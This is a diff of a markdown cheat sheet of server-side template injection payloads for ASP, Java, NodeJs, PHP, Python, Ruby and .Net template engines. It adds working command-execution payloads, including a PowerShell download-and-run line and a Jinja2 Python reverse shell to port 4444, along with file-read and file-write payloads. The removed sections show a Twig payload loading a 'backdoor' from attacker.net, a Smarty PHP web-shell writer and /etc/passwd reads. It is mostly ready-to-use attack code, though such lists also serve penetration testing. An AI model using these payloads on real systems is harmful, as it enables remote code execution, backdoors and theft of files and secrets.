@@ -14,6 +14,22 @@ If the user input is included inside a code block follow these steps
 
 ## Engine identification
 
+### ASP
+
+#### Identification
+
+```
+<%= 7*7 %>
+<%= "foo" %>
+<%= response.write(date()) %>
+```
+
+#### Remote file inclusion
+
+```
+<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('<path to ps1 script>')").StdOut.ReadAll() %>
+```
+
 ### Java
 
 #### Identification
@@ -173,6 +189,72 @@ Newer versions
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"<cmd>\\\",\\\"<first arg>\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
 
+### NodeJs
+
+#### Code execution via handlebars
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+#### Code execution via JsRenderer
+
+```
+{{:"a".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('<cmd>').toString()")()}}
+```
+
+#### XSS via JsRenderer
+
+```
+{{:%22a%22.toString.constructor.call({},%22<XSS payload>%22)()}}
+```
+
+### NodeJs - PugJs
+
+#### Identification
+
+```
+#{{7*7}}
+```
+
+#### Command execution
+
+```
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('<cmd>')}()}
+```
+
+### NodeJs - NUNJUCKS
+
+#### Identification
+
+```
+{{console.log(1)}}
+```
+
+#### Command execution
+
+```
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('<cmd>')")()}}
+```
+
 ### PHP - Smarty
 
 #### Identification
@@ -222,45 +304,159 @@ Newer versions
 {{_self.env.setCache("http://<url>")}}{{_self.env.loadTemplate("<template name>")}}
 ```
 
-### NodeJS
+### Python - Jinja2
 
-#### Code execution via handlebars
-
-```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('whoami');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-#### Code execution via JsRenderer
+#### Identification
 
 ```
-{{:"a".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('<cmd>').toString()")()}}
+{{7*'7'}} = '7777777'
+{{config}}
+{{config.items()}}
+{{settings.SECRET_KEY}}
+{{settings}}
 ```
 
-#### XSS via JsRenderer
+#### Command execution
 
 ```
-{{:%22a%22.toString.constructor.call({},%22<XSS payload>%22)()}}
+{% raw %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<cmd>\", \"<args>\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+{% endraw %}
+
+{{request.application.__globals__.__builtins__.__import__('os')['popen']('<cmd>')['read']()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('<cmd>')['read']()}}
 ```
 
-## Client Side Payloads
+#### Command execution via GET parameter
+
+Register the GET parameter
+
+```
+{% raw %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.<param>).read()}}{%endif%}{%endfor%}
+{% endraw %}
+```
+
+Send a request containing the given parameter with the code to execute as value. For instance a request can be `<url>/?<param>=<code>`
+
+#### Read file
+
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('<file>').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("<file>").read() }}
+```
+
+#### Write file
+
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('<file>', 'w').write('<text to write>') }}
+```
+
+### Python - Tornado
+
+#### Identification
+
+```
+{{7*7}}
+{% raw %}
+{% import foobar %}
+{% endraw %}
+```
+
+#### Command execution
+
+```
+{% raw %}
+{% import os %}
+{% endraw %}
+{{os.system('<cmd>')}}
+```
+
+### Python - Mako
+
+#### Identification
+
+```
+{{7*7}}
+```
+
+#### Command execution
+
+```
+<%
+import os
+x=os.popen('<cmd>').read()
+%>
+```
+
+### Ruby - ERB&#x20;
+
+#### Identification
+
+```
+<%= 7*7 %> = 49
+{{7*7}} = {{7*7}}
+${7*7} = ${7*7}
+```
+
+#### Blind command execution
+
+```
+<%= system("<cmd>") %>
+<%= `<cmd>` %>
+```
+
+#### Command execution
+
+```
+<%= IO.popen('<cmd>').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('<cmd>') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('<cmd>') %><%= @c.readline()%>
+```
+
+#### List folders
+
+```
+<%= Dir.entries('/') %>
+```
+
+#### Read file
+
+```
+<%= File.open('<file>').read %>
+```
+
+### Ruby - Slim
+
+#### Identification
+
+```
+${7*7}
+```
+
+#### Blind command execution
+
+```
+{ %x|env| }
+```
+
+### .Net - Razor
+
+#### Identification
+
+```
+@(2+2)
+@()
+@
+```
+
+#### Command execution
+
+```
+@System.Diagnostics.Process.Start("<cmd>","<args>");
+```
+
+## Client Side
 
 ### AngularJS
 
@@ -286,137 +482,7 @@ Newer versions
 javascript:alert(1)%252f%252f..%252fcss-images
 ```
 
-## Server Side Payloads
 
-### FreeMarker - java
-
-```
-${7*7} = 49
-<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
-```
-
-### Java
-
-```
-${7*7}
-${{7*7}}
-${class.getClassLoader()}
-${class.getResource("").getPath()}
-${class.getResource("../../../../../index.htm").getContent()}
-${T(java.lang.System).getenv()}
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
-```
-
-### Twig - PHP
-
-```
-{{7*7}}
-{{7*'7'}}
-{{dump(app)}}
-{{app.request.server.all|join(',')}}
-"{{'/etc/passwd'|file_excerpt(1,30)}}"@
-{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
-```
-
-### Smarty - PHP
-
-```
-{$smarty.version}
-{php}echo `id`;{/php}
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-```
-
-### Handlebars - NodeJs
-
-```
-wrtz{{#with "s" as |string|}}
-{{#with "e"}}
-{{#with split as |conslist|}}
-{{this.pop}}
-{{this.push (lookup string.sub "constructor")}}
-{{this.pop}}
-{{#with string.split as |codelist|}}
-{{this.pop}}
-{{this.push "return require('child_process').exec('whoami');"}}
-{{this.pop}}
-{{#each conslist}}
-{{#with (string.sub.apply 0 codelist)}}
-{{this}}
-{{/with}}
-{{/each}}
-```
-
-### Velocity
-
-```
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$str.valueOf($chr.toChars($out.read()))
-#end
-```
-
-### ERB - Ruby
-
-```
-<%= system("whoami") %>
-<%= Dir.entries('/') %>
-<%= File.open('/example/arbitrary-file').read %>
-```
-
-### Django - Python
-
-```
-{% raw %}
-{% debug %}
-{% endraw %}
-{{settings.SECRET_KEY}}
-```
-
-### Tornado - Python
-
-```
-{% raw %}
-{% import foobar %} = Error
-{% import os %}
-{% endraw %}{{os.system('whoami')}}
-```
-
-### Mojolicious - Perl
-
-```
-<%= perl code %>
-<% perl code %>
-```
-
-### Flask/Jinja2
-
-```
-{{ '7'*7 }}
-{{ [].class.base.subclasses() }} # get all classes
-{{''.class.mro()[1].subclasses()}}
-{% raw %}
-{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
-{% endraw %}
-
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-```
-
-### Jade
-
-```
-#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
-```
-
-### Razor - .Net
-
-```
-@(1+2)
-@{// C# code}
-```
 
 
 
